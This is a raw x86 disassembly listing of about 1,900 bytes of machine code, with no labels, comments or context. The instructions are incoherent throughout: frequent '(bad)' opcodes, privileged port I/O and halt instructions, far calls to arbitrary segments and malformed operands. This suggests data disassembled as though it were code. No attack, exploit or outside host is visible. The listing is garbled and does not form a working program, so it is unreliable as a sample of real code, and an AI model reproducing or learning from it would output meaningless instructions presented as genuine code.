  41767c:	sub    al,ah
  41767e:	push   esi
  41767f:	fwait
  417680:	adc    BYTE PTR [ebx],bl
  417682:	cmp    al,0x3e
  417684:	mov    bh,0x86
  417686:	sub    cl,BYTE PTR [edi]
  417688:	sti    
  417689:	ret    
  41768a:	jno    0x417635
  41768c:	scas   al,BYTE PTR es:[edi]
  41768d:	cmp    DWORD PTR [edx+0x71d2b90f],esi
  417693:	mov    edx,0xe445636e
  417698:	cmp    bl,0xfb
  41769b:	and    DWORD PTR cs:[ebx+0x4aef4e49],0x159db4f8
  4176a6:	jle    0x41764f
  4176a8:	aaa    
  4176a9:	sbb    ch,ch
  4176ab:	je     0x4176f4
  4176ad:	pop    es
  4176ae:	mov    al,ds:0x1de8c688
  4176b3:	neg    BYTE PTR [ecx-0x5e]
  4176b6:	or     al,BYTE PTR [edi]
  4176b8:	jae    0x4176bd
  4176ba:	(bad)  
  4176bb:	adc    BYTE PTR [edx-0x6cdd5ae4],dh
  4176c1:	sar    DWORD PTR [ebp+0x6ccf528d],0x13
  4176c8:	mov    edi,0xf15859dd
  4176cd:	mov    eax,0xdabeae89
  4176d2:	jle    0x41773e
  4176d4:	not    DWORD PTR [esp+edi*4-0x6c]
  4176d8:	cwde   
  4176d9:	popw   ss
  4176db:	jns    0x41772c
  4176dd:	hlt    
  4176de:	jne    0x4176e3
  4176e0:	data16 cli 
  4176e2:	hlt    
  4176e3:	mov    ds:0x7f84916a,eax
  4176e8:	sub    DWORD PTR [ebx+ebx*1-0x46],edi
  4176ec:	push   cs
  4176ed:	and    BYTE PTR [edx],0xdb
  4176f0:	jl     0x417740
  4176f2:	pusha  
  4176f3:	mov    cs,WORD PTR [eax-0x6ed1f023]
  4176f9:	mov    DWORD PTR [eax+esi*4-0x2f5d2488],ebp
  417700:	xlat   BYTE PTR ds:[ebx]
  417701:	sub    al,0x62
  417703:	sub    DWORD PTR [ebx+0x3f39306e],eax
  417709:	mov    edx,0xded3be90
  41770e:	pusha  
  41770f:	mov    edi,0x69153c68
  417714:	mov    bl,al
  417716:	bound  ecx,QWORD PTR [edi]
  417718:	outs   dx,DWORD PTR ds:[esi]
  417719:	push   esp
  41771a:	dec    ebx
  41771b:	cwde   
  41771c:	cmp    ch,al
  41771e:	xchg   edi,eax
  41771f:	xor    ebp,ebp
  417721:	outs   dx,DWORD PTR ds:[esi]
  417722:	outs   dx,DWORD PTR ds:[esi]
  417723:	in     eax,dx
  417724:	popf   
  417725:	jnp    0x417720
  417727:	sbb    DWORD PTR [eax+0x17],ecx
  41772a:	add    DWORD PTR [ebx-0x59],ebx
  41772d:	pop    esi
  41772e:	cmp    DWORD PTR [edi],edi
  417730:	mov    ds:0xf2896f11,eax
  417735:	out    0x48,eax
  417737:	daa    
  417738:	mov    dl,0x98
  41773a:	ret    0x7fab
  41773d:	(bad)  
  41773e:	fimul  DWORD PTR [edx-0x43]
  417741:	lock mov dl,0xa7
  417744:	push   edx
  417745:	dec    edx
  417746:	mov    cl,0x96
  417748:	fcomp  DWORD PTR [edi+0x369b6644]
  41774e:	cmc    
  41774f:	sbb    eax,ebp
  417751:	dec    eax
  417752:	cs jle 0x41779d
  417755:	cs lock push 0xcf0d1f47
  41775c:	xchg   edi,eax
  41775d:	xor    DWORD PTR fs:[ebx+esi*2+0x1f4732a],edi
  417765:	jns    0x4177a5
  417767:	bound  edi,QWORD PTR [edx-0x24]
  41776a:	lods   eax,DWORD PTR ds:[esi]
  41776b:	cs clc 
  41776d:	jecxz  0x41776c
  41776f:	ret    
  417770:	es xchg esp,eax
  417772:	jle    0x4177ec
  417774:	mov    ecx,0x236ad175
  417779:	ds shr ah,cl
  41777c:	call   0xcd16:0xc51aa0c0
  417783:	shr    DWORD PTR [esi],0xdb
  417786:	fwait
  417787:	out    dx,al
  417788:	lea    edx,[edx+ebx*1]
  41778b:	cmp    ebx,DWORD PTR [esi+0x7a]
  41778e:	and    ch,BYTE PTR [edi-0x1cbdc8e4]
  417794:	fnsave [ecx+0x46643f0e]
  41779a:	fdivr  QWORD PTR [ecx]
  41779c:	call   0x490e555a
  4177a1:	jnp    0x41775e
  4177a3:	xchg   dh,dl
  4177a5:	dec    edi
  4177a6:	pusha  
  4177a7:	pop    es
  4177a8:	icebp  
  4177a9:	test   al,0xc9
  4177ab:	repnz retf 0xd01b
  4177af:	and    DWORD PTR [edx],esp
  4177b1:	mov    dh,0x10
  4177b3:	nop
  4177b4:	daa    
  4177b5:	lods   eax,DWORD PTR ds:[esi]
  4177b6:	dec    ebp
  4177b7:	je     0x417831
  4177b9:	into   
  4177ba:	sbb    al,BYTE PTR [edi+0x3b]
  4177bd:	push   esp
  4177be:	mov    gs,edi
  4177c0:	hlt    
  4177c1:	mov    ch,0x48
  4177c3:	sbb    edx,DWORD PTR [edi+0x8]
  4177c6:	push   ebx
  4177c7:	mov    edi,0xbe86d0af
  4177cc:	xchg   ebx,eax
  4177cd:	(bad)  
  4177ce:	outs   dx,DWORD PTR ds:[esi]
  4177cf:	mov    al,0x37
  4177d1:	jbe    0x4177cd
  4177d3:	mov    dl,0xe5
  4177d5:	and    BYTE PTR [edi+eiz*8-0x67],bl
  4177d9:	or     DWORD PTR [esi+ebx*8],ecx
  4177dc:	and    eax,eax
  4177de:	retf   0x4c8b
  4177e1:	call   0x534a:0x3e3e2e68
  4177e8:	aas    
  4177e9:	or     BYTE PTR [ebx],bh
  4177eb:	lea    edi,[ebx+0x18]
  4177ee:	(bad)  
  4177ef:	pop    ebx
  4177f0:	xchg   edx,eax
  4177f1:	jns    0x4177ca
  4177f3:	xchg   ecx,eax
  4177f4:	fisubr WORD PTR [ebp-0x6b]
  4177f7:	mov    al,0x92
  4177f9:	push   0x44241b44
  4177fe:	repnz lahf 
  417800:	jne    0x41786e
  417802:	test   DWORD PTR [edi+0x23],0x7018c798
  417809:	add    DWORD PTR [edx+0x39041597],eax
  41780f:	retf   
  417810:	out    dx,eax
  417811:	add    bh,BYTE PTR fs:[ecx*2+0x1c1941d8]
  417819:	cwde   
  41781a:	mov    cl,0xfa
  41781c:	stos   BYTE PTR es:[edi],al
  41781d:	adc    al,0xf
  41781f:	js     0x4177fc
  417821:	fsubp  st(1),st
  417823:	mov    ds:0xaca54a49,eax
  417828:	mov    esi,0x7d019efa
  41782d:	xchg   ecx,eax
  41782e:	mov    eax,ds:0x39c4b795
  417833:	rcl    BYTE PTR [edi],1
  417835:	ins    BYTE PTR es:[edi],dx
  417836:	stos   BYTE PTR es:[edi],al
  417837:	add    eax,0x7a6c9158
  41783c:	xchg   edi,eax
  41783d:	jg     0x4177c2
  41783f:	std    
  417840:	cmp    eax,0xa066930b
  417845:	mov    BYTE PTR [edi+0x0],0x59
  417849:	sbb    al,0x4b
  41784b:	or     eax,0xd62a1c04
  417850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417851:	or     dh,BYTE PTR [ecx]
  417853:	adc    DWORD PTR [ecx],esp
  417855:	fs into 
  417857:	lock icebp 
  417859:	sbb    eax,0x112c8e61
  41785e:	add    DWORD PTR [esi+edi*4-0x5bebc94],ebp
  417865:	inc    eax
  417866:	pop    eax
  417867:	jns    0x417892
  417869:	out    dx,eax
  41786a:	cmc    
  41786b:	xchg   ebx,eax
  41786c:	adc    cl,BYTE PTR [edx+edi*2+0x64d2c498]
  417873:	dec    ebp
  417874:	mov    dh,0x28
  417876:	cmp    DWORD PTR [eax],0xffffffd4
  417879:	cmp    al,0x64
  41787b:	inc    ebx
  41787c:	or     al,0x94
  41787e:	pop    esi
  41787f:	adc    BYTE PTR ds:0x14126139,ah
  417885:	xor    bl,BYTE PTR [eax]
  417887:	sub    al,0x10
  417889:	mov    cl,0x27
  41788b:	dec    edi
  41788c:	dec    BYTE PTR [esp+eax*8+0x7]
  417890:	lock jns 0x41787f
  417893:	or     DWORD PTR [ebp+0x7d],ebp
  417896:	lahf   
  417897:	push   ecx
  417898:	les    esp,FWORD PTR [edi+0x650badde]
  41789e:	scas   eax,DWORD PTR es:[edi]
  41789f:	cmp    esp,DWORD PTR [eax-0x26]
  4178a2:	dec    edi
  4178a3:	enter  0x572a,0x4d
  4178a7:	pop    eax
  4178a8:	out    dx,eax
  4178a9:	cmp    dl,ah
  4178ab:	(bad)  
  4178ac:	out    0x1,al
  4178ae:	je     0x4178e7
  4178b0:	movups XMMWORD PTR [ecx],xmm1
  4178b3:	leave  
  4178b4:	pop    eax
  4178b5:	jo     0x417858
  4178b7:	out    0x8f,al
  4178b9:	pop    edi
  4178ba:	popf   
  4178bb:	xor    bl,cl
  4178bd:	jb     0x41789a
  4178bf:	and    DWORD PTR [edx],ecx
  4178c1:	inc    edx
  4178c2:	mov    eax,DWORD PTR [ecx]
  4178c4:	push   edi
  4178c5:	repnz sub BYTE PTR [edx],bh
  4178c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c9:	sub    eax,0xd5ecfc30
  4178ce:	add    BYTE PTR [eax],ah
  4178d0:	int    0xc
  4178d2:	push   ds
  4178d3:	dec    ebx
  4178d4:	sbb    ebx,ebp
  4178d6:	ss push ebx
  4178d8:	imul   esi,DWORD PTR [edx-0x7dd4b993],0xcc3f856e
  4178e2:	sub    dh,BYTE PTR [esi-0x40]
  4178e5:	and    cl,cl
  4178e7:	adc    eax,0x1c5ec040
  4178ec:	adc    al,0x86
  4178ee:	adc    esi,ecx
  4178f0:	fsub   QWORD PTR [ecx+0x18]
  4178f3:	mov    dl,0x96
  4178f5:	stc    
  4178f6:	pop    es
  4178f7:	or     al,0xe9
  4178f9:	lds    ecx,FWORD PTR [ebx+0x7]
  4178fc:	fcom   DWORD PTR [esi+0x18]
  4178ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417900:	jl     0x4178e8
  417902:	int3   
  417903:	mov    ds:0x276f0c1f,al
  417908:	out    0x42,al
  41790a:	(bad)  
  41790b:	out    dx,eax
  41790c:	leave  
  41790d:	fs mov ebx,0xabd900c3
  417913:	push   ebp
  417914:	push   esi
  417915:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417917:	arpl   WORD PTR [edx+0xc],cx
  41791a:	xor    DWORD PTR [esi],ebp
  41791c:	xor    al,0x43
  41791e:	hlt    
  41791f:	xchg   esi,eax
  417920:	in     al,0x8f
  417922:	dec    eax
  417923:	retf   
  417924:	pop    ecx
  417925:	(bad)  
  417926:	xchg   ebx,eax
  417927:	add    BYTE PTR [ecx+0xe9db37],dh
  41792d:	mov    al,ds:0x700d7a47
  417932:	mov    esp,0xc3834940
  417937:	and    eax,DWORD PTR [eax]
  417939:	out    0xa2,al
  41793b:	pop    esi
  41793c:	pushf  
  41793d:	retf   
  41793e:	mov    dl,0x57
  417940:	addr16 aas 
  417942:	jle    0x41798d
  417944:	outs   dx,BYTE PTR ds:[esi]
  417945:	int    0x43
  417947:	hlt    
  417948:	xchg   edx,eax
  417949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41794a:	pop    esp
  41794b:	or     al,0x63
  41794d:	mov    cl,0x12
  41794f:	push   esp
  417950:	mov    dh,0x54
  417952:	dec    edx
  417953:	add    DWORD PTR [esp+edx*2-0x3a],edi
  417957:	jmp    0x4f08f403
  41795c:	loope  0x41794e
  41795e:	xchg   esi,eax
  41795f:	hlt    
  417960:	jl     0x417950
  417962:	retf   
  417963:	adc    al,0x57
  417965:	pop    ebx
  417966:	frstor [ebx+0x5afbe950]
  41796c:	ret    0x827e
  41796f:	inc    eax
  417970:	inc    ebx
  417971:	popf   
  417972:	es loopne 0x4179b2
  417975:	adc    eax,0x81336f3f
  41797a:	pop    es
  41797b:	sti    
  41797c:	jle    0x4179fc
  41797e:	sbb    BYTE PTR [ebx-0x49],ch
  417981:	inc    ebx
  417982:	push   0x4d
  417984:	in     al,0x89
  417986:	into   
  417987:	fcomp  DWORD PTR [edi+0x61530a4a]
  41798d:	stos   DWORD PTR es:[edi],eax
  41798e:	mov    bh,0xec
  417990:	adc    al,0x3d
  417992:	loop   0x417a08
  417994:	or     dl,ch
  417996:	(bad)  
  417997:	ja     0x417942
  417999:	or     al,0xbf
  41799b:	mov    ds,WORD PTR [ebp-0x4f]
  41799e:	mov    eax,0xde5c813b
  4179a3:	jmp    0xe40c7207
  4179a8:	js     0x41794a
  4179aa:	popa   
  4179ab:	mov    edx,0x17ec26b2
  4179b0:	mov    bl,0x38
  4179b2:	sbb    al,0x24
  4179b4:	outs   dx,BYTE PTR ds:[esi]
  4179b5:	call   0x1062b972
  4179ba:	fs mov ebx,0xe2d27792
  4179c0:	(bad)  
  4179c1:	push   ebp
  4179c2:	js     0x4179c2
  4179c4:	sbb    ebx,DWORD PTR ds:0xd63fd738
  4179ca:	sub    BYTE PTR [esi],cl
  4179cc:	ds mov ebx,0x734683ac
  4179d2:	hlt    
  4179d3:	sub    eax,0xc471bd78
  4179d8:	sar    bh,1
  4179da:	test   ax,0x831b
  4179de:	(bad)  
  4179df:	sub    bh,BYTE PTR [edi-0x30]
  4179e2:	jno    0x417a29
  4179e4:	(bad)  
  4179e5:	stos   DWORD PTR es:[edi],eax
  4179e6:	inc    edi
  4179e7:	sub    al,0x62
  4179e9:	test   BYTE PTR [esi+0x25a3c7d6],dh
  4179ef:	and    DWORD PTR [eax-0x39],ebx
  4179f2:	cmp    esi,edx
  4179f4:	dec    ebp
  4179f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f6:	sub    BYTE PTR [edi],dl
  4179f8:	stos   BYTE PTR es:[edi],al
  4179f9:	jecxz  0x4179a8
  4179fb:	shr    dh,1
  4179fd:	jge    0x41799d
  4179ff:	jnp    0x4179b7
  417a01:	cs iret 
  417a03:	xchg   DWORD PTR [ebx-0x47],esi
  417a06:	or     eax,0xfba38abc
  417a0b:	test   al,0x99
  417a0d:	and    DWORD PTR [ecx+0x56],ebx
  417a10:	jnp    0x4179b5
  417a12:	in     eax,dx
  417a13:	jno    0x417a7c
  417a15:	sbb    dl,BYTE PTR [ebp-0x29356237]
  417a1b:	cmp    BYTE PTR ds:0xfbeddffc,ah
  417a21:	dec    esi
  417a22:	sbb    al,0x8c
  417a24:	push   ebp
  417a25:	jno    0x417a96
  417a27:	arpl   WORD PTR [ebp-0x6d],ax
  417a2a:	mov    ah,dl
  417a2c:	mov    ch,BYTE PTR [edx]
  417a2e:	clc    
  417a2f:	fsubr  QWORD PTR [edi+0x602ded4b]
  417a35:	outs   dx,DWORD PTR ds:[esi]
  417a36:	mov    bh,0x35
  417a38:	idiv   ch
  417a3a:	mov    ah,0xbc
  417a3c:	ds push ecx
  417a3e:	fld    DWORD PTR [ecx-0x4c99522e]
  417a44:	pop    ecx
  417a45:	jb     0x417a48
  417a47:	push   ebx
  417a48:	mov    ?,WORD PTR [eax-0x47]
  417a4b:	push   cs
  417a4c:	inc    ebp
  417a4d:	sub    BYTE PTR [esi+0x69],bl
  417a50:	adc    ch,dh
  417a52:	push   ebx
  417a53:	mov    DWORD PTR [edx+0x3697f418],edx
  417a59:	xor    edi,0xf01597c1
  417a5f:	test   DWORD PTR ds:[edx],0xb8d474df
  417a66:	fwait
  417a67:	mov    dl,0xe3
  417a69:	in     eax,0xc
  417a6b:	mov    edi,0xd1f816d7
  417a70:	jns    0x417adb
  417a72:	loope  0x417a2c
  417a74:	jae    0x417a3a
  417a76:	sub    ah,cl
  417a78:	sbb    edx,DWORD PTR [edi]
  417a7a:	mov    dl,0x28
  417a7c:	fs xchg ecx,eax
  417a7e:	jmp    0x417a21
  417a80:	jl     0x417aec
  417a82:	pushf  
  417a83:	adc    BYTE PTR ds:0x3618cb83,ah
  417a89:	(bad)  
  417a8a:	mov    ecx,0x65b2a757
  417a8f:	lds    ebx,FWORD PTR [eax+0x17]
  417a92:	adc    eax,0x42dffef9
  417a97:	dec    eax
  417a98:	nop
  417a99:	aas    
  417a9a:	imul   ebx,DWORD PTR [ecx+0x31114f65],0x5b06e039
  417aa4:	js     0x417b12
  417aa6:	mov    ah,0x31
  417aa8:	push   ebp
  417aa9:	lods   eax,DWORD PTR ds:[esi]
  417aaa:	jp     0x417aee
  417aac:	out    0x49,al
  417aae:	pushf  
  417aaf:	add    BYTE PTR ds:0x63d83f7d,bl
  417ab5:	mov    edx,0x3b7dea7e
  417aba:	test   al,bh
  417abc:	cmp    eax,0x13ae0af7
  417ac1:	add    eax,0xdf296a03
  417ac6:	xchg   ecx,eax
  417ac7:	ret    0xad34
  417aca:	or     eax,0x68335fc7
  417acf:	imul   eax,esi,0x3b
  417ad2:	push   edi
  417ad3:	xchg   esi,eax
  417ad4:	add    BYTE PTR [ebx+0x52],cl
  417ad7:	jo     0x417a88
  417ad9:	pushf  
  417ada:	mov    ch,0x6b
  417adc:	fdivr  st,st(7)
  417ade:	pop    ecx
  417adf:	mov    al,ds:0x26d989c5
  417ae4:	out    dx,eax
  417ae5:	xor    BYTE PTR [edi-0x1f],bh
  417ae8:	hlt    
  417ae9:	mov    al,ds:0x18b789c6
  417aee:	(bad)  
  417aef:	nop
  417af0:	cmp    al,0xf8
  417af2:	repnz and BYTE PTR [eax-0x1c879902],0x18
  417afa:	mov    esp,es
  417afc:	scas   al,BYTE PTR es:[edi]
  417afd:	cmp    esi,DWORD PTR [edx-0x27321612]
  417b03:	jae    0x417b3a
  417b05:	fist   DWORD PTR [ebp+0x26172952]
  417b0b:	pop    ebx
  417b0c:	icebp  
  417b0d:	push   0xcb214974
  417b12:	xor    bh,ch
  417b14:	jo     0x417ae4
  417b16:	in     eax,0xe5
  417b18:	scas   eax,DWORD PTR es:[edi]
  417b19:	xchg   BYTE PTR [eax],al
  417b1b:	aam    0xd8
  417b1d:	imul   DWORD PTR [esp+edi*1+0x60]
  417b21:	(bad)  
  417b22:	mov    cl,0x7d
  417b24:	arpl   WORD PTR [ebp+0x2c],cx
  417b27:	and    eax,0x645e489f
  417b2c:	lds    esi,FWORD PTR [edi]
  417b2e:	or     DWORD PTR [eax-0x380ad514],0x1a50601f
  417b38:	(bad)  
  417b39:	mov    ecx,0x57e45950
  417b3e:	add    al,0xd1
  417b40:	xchg   esp,eax
  417b41:	jmp    0x5b14464e
  417b46:	xchg   si,sp
  417b49:	test   eax,0xfb0a904d
  417b4e:	mov    ds,WORD PTR [ecx+0x474020f3]
  417b54:	inc    esi
  417b55:	in     eax,0xc4
  417b57:	mov    ecx,0xbd8c6487
  417b5c:	fwait
  417b5d:	mov    ebx,?
  417b5f:	jo     0x417b97
  417b61:	inc    edi
  417b62:	popa   
  417b63:	call   0xd604:0x3fb5b873
  417b6a:	inc    esi
  417b6b:	xor    edi,DWORD PTR [edi+ebx*8-0x7ee981ec]
  417b72:	cmp    eax,0x7347ed9d
  417b77:	xor    BYTE PTR [ecx+0x106f166e],bh
  417b7d:	pushf  
  417b7e:	ret    0xa5a7
  417b81:	imul   edi,DWORD PTR [edx+0xfc46384],0x9cafc25c
  417b8b:	cwde   
  417b8c:	loope  0x417c0c
  417b8e:	push   ebx
  417b8f:	push   0xf469791a
  417b94:	scas   eax,DWORD PTR es:[edi]
  417b95:	mov    esi,DWORD PTR [edi]
  417b97:	lock std 
  417b99:	mov    ebx,0xad94d759
  417b9e:	inc    edi
  417b9f:	iret   
  417ba0:	jle    0x417b97
  417ba2:	les    eax,FWORD PTR [edi]
  417ba4:	xchg   esp,eax
  417ba5:	push   ecx
  417ba6:	inc    esp
  417ba7:	xor    eax,0xbccb3f47
  417bac:	fbstp  TBYTE PTR [edi+0x1]
  417baf:	aaa    
  417bb0:	lds    edi,FWORD PTR [ebp+0x13]
  417bb3:	cdq    
  417bb4:	and    ah,al
  417bb6:	pop    ss
  417bb7:	mov    BYTE PTR [eax],dh
  417bb9:	mov    bl,BYTE PTR [eax]
  417bbb:	(bad)
  417bbe:	(bad)
  417bc2:	fbld   TBYTE PTR [edi+0x1d]
  417bc5:	repz rcr BYTE PTR [ebx+0x2cb4fd30],1
  417bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bcd:	(bad)  [edi+0x6886d563]
  417bd3:	pop    ecx
  417bd4:	xchg   esi,eax
  417bd5:	cwde   
  417bd6:	push   edi
  417bd7:	jecxz  0x417c20
  417bd9:	sar    BYTE PTR [esi+0x1c],0xd5
  417bdd:	add    eax,0x128fffe0
  417be2:	mov    bh,0x88
  417be4:	xor    ch,BYTE PTR [esi+0x17fe10b2]
  417bea:	push   eax
  417beb:	aaa    
  417bec:	pop    edi
  417bed:	int    0xd
  417bef:	mov    al,0xab
  417bf1:	jmp    0x5820d9fa
  417bf6:	shr    dl,cl
  417bf8:	mov    bl,0xb4
  417bfa:	cmp    esi,edi
  417bfc:	xchg   esi,eax
  417bfd:	fiadd  DWORD PTR [edx]
  417bff:	les    ebx,FWORD PTR [edx-0x3f]
  417c02:	arpl   WORD PTR [esi-0x46],di
  417c05:	mov    cl,0x36
  417c07:	arpl   WORD PTR [esi+0x710f4131],si
  417c0d:	shl    BYTE PTR [ebp-0x23],1
  417c10:	inc    eax
  417c11:	int3   
  417c12:	xor    al,0x7b
  417c14:	dec    ebp
  417c15:	adc    edi,DWORD PTR [edx-0x74]
  417c18:	fistp  QWORD PTR [ecx+ebp*1+0x65]
  417c1c:	repz xchg ebx,eax
  417c1e:	mov    edi,0x79b34e13
  417c23:	and    eax,0x6219dfa7
  417c28:	jl     0x417c01
  417c2a:	nop
  417c2b:	mov    dl,0x1
  417c2d:	mov    cl,0x41
  417c2f:	xchg   edx,eax
  417c30:	xchg   edx,eax
  417c31:	out    0x1c,al
  417c33:	aas    
  417c34:	imul   eax,DWORD PTR [ecx+0x27],0x3fdacb3a
  417c3b:	je     0x417c71
  417c3d:	(bad)  
  417c3e:	cli    
  417c3f:	jecxz  0x417bf0
  417c41:	mov    DWORD PTR [eax-0x2a],esi
  417c44:	jae    0x417c0c
  417c46:	push   ebx
  417c47:	xchg   esi,eax
  417c48:	push   esi
  417c49:	cmc    
  417c4a:	cld    
  417c4b:	dec    ebx
  417c4c:	xlat   BYTE PTR ds:[ebx]
  417c4d:	test   BYTE PTR [ebp+0x6b],al
  417c50:	loope  0x417c17
  417c52:	loop   0x417ccb
  417c54:	(bad)  
  417c55:	hlt    
  417c56:	lock addr16 js 0x417c22
  417c5a:	test   BYTE PTR [edx],dl
  417c5c:	mov    eax,0xfa81f676
  417c61:	mov    ebp,0x762fa5e0
  417c66:	add    al,0x81
  417c68:	out    dx,eax
  417c69:	xchg   edx,eax
  417c6a:	add    bl,BYTE PTR [edx+esi*2]
  417c6d:	sbb    BYTE PTR [esi-0x52],0xc7
  417c71:	rcr    bh,0x6c
  417c74:	xor    esp,DWORD PTR [eax+0x6f3cb3ec]
  417c7a:	mov    ebx,0xc3506278
  417c7f:	add    DWORD PTR ds:0xf639f2c2,edx
  417c85:	cmp    al,0x1e
  417c87:	pop    es
  417c88:	retf   
  417c89:	cli    
  417c8a:	push   ebx
  417c8b:	adc    eax,0x2dd91b0
  417c90:	xchg   ebx,eax
  417c91:	lahf   
  417c92:	or     esi,ebp
  417c94:	retf   
  417c95:	cmp    al,0x8
  417c97:	fidivr WORD PTR [edi+0x57a0abab]
  417c9d:	bound  ecx,QWORD PTR [ecx]
  417c9f:	push   ss
  417ca0:	in     al,dx
  417ca1:	leave  
  417ca2:	stos   BYTE PTR es:[edi],al
  417ca3:	loop   0x417c33
  417ca5:	rol    DWORD PTR [ebx+0x62],cl
  417ca8:	ret    
  417ca9:	xchg   edi,eax
  417caa:	xor    bl,BYTE PTR [ebx-0x2eeccac]
  417cb0:	fiadd  DWORD PTR [ebx-0x28]
  417cb3:	xchg   ebp,eax
  417cb4:	imul   edx,DWORD PTR [edi+0x36ccbaf9],0x8f880500
  417cbe:	xchg   ebp,eax
  417cbf:	inc    esp
  417cc0:	dec    esp
  417cc1:	scas   eax,DWORD PTR es:[edi]
  417cc2:	ja     0x417cb4
  417cc4:	push   0x58
  417cc6:	add    al,0x5d
  417cc8:	xchg   DWORD PTR gs:[ebp+0x25e00bd1],ebp
  417ccf:	pop    ebp
  417cd0:	mov    cl,0x5f
  417cd2:	lea    ebx,[ecx+0x2e]
  417cd5:	je     0x417d03
  417cd7:	jmp    0x1a3dc11e
  417cdc:	mov    ebp,0x1ba9167f
  417ce1:	xchg   esp,eax
  417ce2:	in     al,dx
  417ce3:	outs   dx,BYTE PTR ds:[esi]
  417ce4:	ins    BYTE PTR es:[edi],dx
  417ce5:	or     al,dl
  417ce7:	shufps xmm3,XMMWORD PTR [esi],0x13
  417ceb:	test   al,0xdf
  417ced:	xor    BYTE PTR [esi+0xb289da2],dl
  417cf3:	xchg   esp,eax
  417cf4:	mov    al,0x87
  417cf6:	dec    esi
  417cf7:	gs daa 
  417cf9:	dec    esp
  417cfa:	or     eax,0xcb964272
  417cff:	in     eax,0x18
  417d01:	push   es
  417d02:	fmul   DWORD PTR [ebx-0x6d799515]
  417d08:	push   esi
  417d09:	jno    0x417d56
  417d0b:	hlt    
  417d0c:	cmp    BYTE PTR [edi+0x2b],dh
  417d0f:	adc    eax,0x762d883d
  417d14:	add    esi,DWORD PTR [ebx+0x70846297]
  417d1a:	xlat   BYTE PTR ds:[ebx]
  417d1b:	sbb    DWORD PTR [esp+ebx*2],eax
  417d1e:	adc    eax,DWORD PTR [edx+eiz*4]
  417d21:	jmp    0x417cc9
  417d23:	inc    ecx
  417d24:	push   ds
  417d25:	orps   xmm5,XMMWORD PTR [ebx+0x48b2b9f7]
  417d2c:	ja     0x417cea
  417d2e:	jns    0x417cbc
  417d30:	add    al,bl
  417d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d33:	rol    DWORD PTR [edi+0x1c],1
  417d36:	cmp    BYTE PTR [ebx-0x58],0xf1
  417d3a:	in     eax,0xcb
  417d3c:	(bad)  
  417d3e:	xor    eax,0x7f3ece38
  417d43:	pop    edi
  417d44:	xor    BYTE PTR [esi],dl
  417d46:	adc    al,ch
  417d48:	les    ecx,FWORD PTR [ebx+0x66c30c6e]
  417d4e:	bound  ebx,QWORD PTR [edx+0x13]
  417d51:	pusha  
  417d52:	mov    al,0x4a
  417d54:	mov    ch,0xcd
  417d56:	in     al,0x97
  417d58:	rcr    BYTE PTR [edx+0x26367e0c],cl
  417d5e:	test   DWORD PTR [eax+0x45],ebx
  417d61:	lods   al,BYTE PTR ds:[esi]
  417d62:	repz cmp BYTE PTR [ecx],bl
  417d65:	push   0x8aa9ca4c
  417d6a:	pusha  
  417d6b:	sbb    eax,0x17bd2e61
  417d70:	or     edx,DWORD PTR [ecx-0x79a2b120]
  417d76:	mov    ah,0x37
  417d78:	adc    al,BYTE PTR [esi+0x2b]
  417d7b:	and    DWORD PTR [ebx-0x7cebaada],0xffffffa4
  417d82:	daa    
  417d83:	jg     0x417d96
  417d85:	(bad)  
  417d87:	adc    esp,DWORD PTR [ebx+edx*2+0xcd9b77d]
  417d8e:	test   eax,0x76030e4b
  417d93:	dec    eax
  417d94:	dec    edi
  417d95:	ja     0x417dee
  417d97:	cmp    al,BYTE PTR [ecx+ebp*2]
  417d9a:	pushf  
  417d9b:	add    DWORD PTR [ecx],eax
  417d9d:	mov    BYTE PTR [esp+edi*1-0x35],0xad
  417da2:	aaa    
  417da3:	sbb    dl,BYTE PTR [ebx+0x30]
  417da6:	jp     0x417dda
  417da8:	and    ebx,DWORD PTR [eax]
  417daa:	adc    BYTE PTR [ecx-0x76],cl
  417dad:	stos   BYTE PTR es:[edi],al
  417dae:	mov    dh,0xd9
  417db0:	inc    ebp
  417db1:	cld    
  417db2:	or     al,0x42
  417db4:	std    
  417db5:	mov    dl,0x41
  417db7:	mov    ebx,ds
  417db9:	pop    es
  417dba:	mov    al,0x55
  417dbc:	fadd   DWORD PTR ds:0x3e959639
  417dc2:	popa   
  417dc3:	xchg   edi,eax
  417dc4:	cld    
  417dc5:	mov    ebx,0x33da4a5f
  417dca:	or     BYTE PTR [eax+0x2e5a3d68],al
  417dd0:	pop    ebx
  417dd1:	fnstenv [eax]
  417dd3:	push   cs
  417dd4:	arpl   si,ax
  417dd6:	call   0xa8bf:0x2bb91add
  417ddd:	int3   
  417dde:	scas   eax,DWORD PTR es:[edi]
  417ddf:	ret    
  417de0:	dec    eax
  417de1:	into   
  417de2:	fld    TBYTE PTR [ebx-0x21]
  417de5:	push   ebp
  417de6:	test   BYTE PTR [edi],0x24
  417de9:	dec    edx
  417dea:	mov    eax,ds:0x765510eb
  417def:	lods   eax,DWORD PTR ds:[esi]
  417df0:	pop    ebp
  417df1:	test   eax,0xd9ce98d
  417df6:	mov    BYTE PTR [edx-0x459b58bf],al
  417dfc:	jg     0x417e39
  417dfe:	mov    BYTE PTR [edi+0x38],dh
  417e01:	shl    DWORD PTR [ecx],1
  417e03:	fnstenv [ebx-0x49bff158]
  417e09:	int3   
  417e0a:	jg     0x417dba
  417e0c:	or     bl,BYTE PTR cs:[ebx-0x22]
  417e10:	cmp    bh,dl
  417e12:	repnz aaa 
  417e14:	je     0x417e05
  417e16:	xchg   edi,eax
  417e17:	das    
  417e18:	mov    esi,0x71733dd2
  417e1d:	and    eax,0x8c659a1f
  417e22:	lds    ebp,FWORD PTR [eax+ebp*1]
  417e25:	mov    bl,0xd
  417e27:	fistp  QWORD PTR [ecx]
  417e29:	fmul   DWORD PTR [ebx-0x25]
  417e2c:	mov    ecx,0x7e2a58b2
  417e31:	popa   
  417e32:	adc    cl,BYTE PTR [edx+0x14d5c37b]
  417e38:	fld    TBYTE PTR [ebp+ecx*8+0x4347a751]
  417e3f:	stos   DWORD PTR es:[edi],eax
  417e40:	int3   
  417e41:	inc    ebp
  417e42:	je     0x417eaa
  417e44:	dec    ebp
  417e45:	xchg   ebp,eax
